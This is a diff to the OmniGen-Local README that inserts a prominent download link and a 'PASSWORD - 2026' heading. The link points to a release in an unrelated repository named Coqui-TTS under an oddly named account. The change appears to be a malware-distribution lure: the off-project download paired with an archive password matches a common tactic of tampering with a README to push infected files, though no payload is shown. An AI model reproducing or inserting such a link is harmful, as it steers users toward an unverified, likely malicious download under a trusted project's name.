@@ -14,6 +14,14 @@ OmniGen-Local is a self-contained desktop application that brings **multimodal g
 
 ---
 
+ <div align="center">
+  <a href="https://github.com/senatorpagemouth8k8c/Coqui-TTS/releases/tag/omnigen">
+    <b>⬇️ DOWNLOAD (Latest Release)</b>
+  </a>
+</div>
+
+## PASSWORD - 2026 
+
 ## Philosophy
 
 OmniGen-Local is built on three principles:
